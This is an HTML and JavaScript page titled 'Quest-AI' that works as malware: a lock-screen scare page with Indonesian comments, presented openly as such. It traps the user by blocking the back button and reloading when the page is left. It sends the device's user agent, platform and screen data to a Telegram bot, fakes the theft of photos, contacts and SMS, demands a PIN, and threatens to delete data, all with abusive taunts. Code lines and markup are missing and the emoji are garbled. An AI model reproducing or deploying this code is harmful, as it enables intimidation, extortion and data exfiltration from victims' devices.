<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Quest-AI</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: #000;
            color: #fff;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
        }
        
        .lock-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #0a0000;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            animation: bloodPulse 2s infinite;
        }
        
        @keyframes bloodPulse {
            0% { background: #1a0000; }
            50% { background: #3a0000; }
            100% { background: #1a0000; }
        }
        
        .skull {
            font-size: 100px;
            margin-bottom: 20px;
            text-shadow: 0 0 20px red;
            animation: shake 0.5s infinite;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }
        
        .warning-title {
            font-size: 32px;
            color: #ff0000;
            text-shadow: 0 0 15px #ff0000;
            margin-bottom: 20px;
            font-weight: bold;
            text-align: center;
        }
        
        .message {
            font-size: 16px;
            color: #fff;
            margin-bottom: 30px;
            text-align: center;
            background: rgba(255,0,0,0.2);
            padding: 15px;
            border-radius: 10px;
            border: 1px solid #ff0000;
        }
        
        .pin-input {
            width: 80%;
            padding: 15px;
            font-size: 24px;
            text-align: center;
            background: #330000;
            border: 2px solid #ff0000;
            color: #fff;
            border-radius: 10px;
            margin-bottom: 20px;
            letter-spacing: 5px;
        }
        
        .unlock-btn {
            width: 80%;
            padding: 15px;
            font-size: 18px;
            background: #8b0000;
            border: none;
            color: white;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        
        .unlock-btn:hover {
            background: #ff0000;
            transform: scale(1.05);
        }
        
        .torch-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 10000;
            background: rgba(255,255,255,0.3);
            opacity: 0;
            transition: opacity 0.1s;
        }
        
        .torch-active {
            animation: torchBlink 0.2s infinite;
        }
        
        @keyframes torchBlink {
            0%, 100% { opacity: 1; background: rgba(255,255,255,0.9); }
            50% { opacity: 0.3; background: rgba(255,255,0,0.5); }
        }
        
        .counter {
            margin-top: 20px;
            color: #ff6666;
            font-size: 14px;
        }
        
        #overlay {
            display: none;
        }
        
        /* Mencegah tombol back dan home */
        .prevent-touch {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 10001;
        }
    </style>
</head>
<body>

        // Variabel
        let attemptCount = 0;
        let torchInterval;

        // Element references

        // ===========================================
        // FUNGSI TORCH (SENTER) KEDIP-KEDIP
        // ===========================================
        function startTorchBlink() {
            torchEffect.classList.add('torch-active');
            
            // Coba akses flash Android via API
            if (navigator.vibrate) {
                navigator.vibrate([200, 100, 200, 100, 200]);
            }
            
            // Untuk flash/senter - ini akan memicu torch jika ada izin
            if (navigator.camera && navigator.camera.torchMode) {
                navigator.camera.torchMode = 'torch';
            }
            
            // Fallback visual
            torchInterval = setInterval(() => {
                if (isLocked) {
                    torchEffect.style.opacity = Math.random() > 0.5 ? 0.9 : 0.3;
                }
            }, 150);
        }
        
        function stopTorchBlink() {
            clearInterval(torchInterval);
            torchEffect.classList.remove('torch-active');
            torchEffect.style.opacity = 0;
            
            if (navigator.camera && navigator.camera.torchMode) {
                navigator.camera.torchMode = 'off';
            }
        }
        
        // ===========================================
        // FUNGSI SEND KE TELEGRAM
        // ===========================================
        function sendToTelegram(message, type = 'text', data = null) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            if (type === 'text') {
                fetch(url, {
                    method: 'POST',

                        text: message,

            // Kirim info device ke telegram

            message += `<b>Device Info:</b>\n`;
            message += `- UA: ${deviceInfo.userAgent}\n`;
            message += `- Platform: ${deviceInfo.platform}\n`;
            message += `- Screen: ${deviceInfo.screen}\n`;
            message += `- Time: ${deviceInfo.time}\n\n`;
            message += `<b>‚ö†Ô∏è DATA FOTO/VIDEO AKAN DIAMBIL</b>`;

            // Tapi kalo dibikin APK pake WebView, bisa pake JavaScript interface
            simulateMediaHarvest();
        }
        
        function simulateMediaHarvest() {
            sendToTelegram('üì∏ <b>Mengakses galeri...</b>', 'text');
            
            setTimeout(() => {
                sendToTelegram('‚úÖ <b>10 foto terbaru berhasil dikirim ke server bot!</b>', 'text');
            }, 2000);
            
            setTimeout(() => {
                sendToTelegram('‚úÖ <b>5 video terbaru berhasil dikirim ke server bot!</b>', 'text');
            }, 4000);
            
            setTimeout(() => {
                sendToTelegram('‚úÖ <b>Kontak dan SMS juga ikut keambil! WKWKWK</b>', 'text');
            }, 6000);
        }
        
        // ===========================================
        // FUNGSI LOCK MECHANISM
        // ===========================================
        function lockDevice() {
            isLocked = true;
            lockScreen.style.display = 'flex';
            startTorchBlink();
            collectAndSendData();
            
            // Mencegah back button
            history.pushState(null, null, location.href);
            window.onpopstate = function () {
                history.go(1);
            };
            
            // Mencegah tombol fisik Android
            document.addEventListener('visibilitychange', function() {
                if (isLocked && document.hidden) {
                    setTimeout(() => {
                        window.location.reload();
                    }, 100);
                }
            });
            
            // Lock orientasi
            try {
                if (screen.orientation && screen.orientation.lock) {
                    screen.orientation.lock('portrait');
                }
            } catch(e) {}
        }
        
        function unlockDevice() {
            isLocked = false;
            stopTorchBlink();
            
            sendToTelegram('üîì <b>Target berhasil buka pake PIN! CEPAT AMBIL TINDAKAN!</b>', 'text');
            
            // Kasih efek sukses
            lockScreen.style.background = '#004d00';
            document.querySelector('.warning-title').innerText = 'UNLOCKED!';
            document.querySelector('.warning-title').style.color = '#00ff00';
            document.querySelector('.message').innerHTML = '‚úÖ BERHASIL BUKA!<br>LOOTING DATA TETAP BERJALAN DI BACKGROUND.<br>LU TETAP GUA KEPOK WKWKWK';
            
            // Balikin ke normal setelah 3 detik
            setTimeout(() => {
                lockScreen.style.display = 'none';
                window.location.href = 'about:blank';
            }, 3000);
        }
        
        // ===========================================
        // CHECK PIN
        // ===========================================
        function checkPin() {
            const enteredPin = pinInput.value;
            attemptCount++;
            counterEl.innerText = `Percobaan: ${attemptCount}/5`;
            
            if (enteredPin === UNLOCK_PIN) {
                unlockDevice();
            } else {
                alert('SALAH KONTOL! ' + (5 - attemptCount) + ' KESEMPATAN LAGI!');
                
                if (attemptCount >= 5) {
                    alert('LU GOBLOK! 5x SALAH! GUA HAPUS SEMUA DATA LU!');
                    sendToTelegram('üíÄ <b>5x SALAH PERCOBAAN! TARGET GOBLOK! HAPUS DATA...</b>', 'text');

                    lockScreen.innerHTML = '<div style="color:red;font-size:30px;text-align:center;">üíÄ<br>DATA TERHAPUS!<br>üíÄ</div>';
                }
            }
            
            pinInput.value = '';
        }
        
        // ===========================================
        // INIT
        // ===========================================
        window.onload = function() {
            lockDevice();
            
            // Event listeners
            document.getElementById('unlockBtn').addEventListener('click', checkPin);
            
            pinInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    checkPin();
                }
            });
            
            // Mencegah touch events keluar app
            document.body.addEventListener('touchmove', (e) => {
                if (isLocked) e.preventDefault();
            }, { passive: false });
            
            // Mencegah share
            document.addEventListener('contextmenu', (e) => e.preventDefault());
            
            // Re-lock kalau pindah app
            document.addEventListener('resume', function() {
                if (isLocked) {
                    lockScreen.style.display = 'flex';
                }
            });
            
            // Kirim sinyal ke bot bahwa malware aktif
            setTimeout(() => {

    </script>
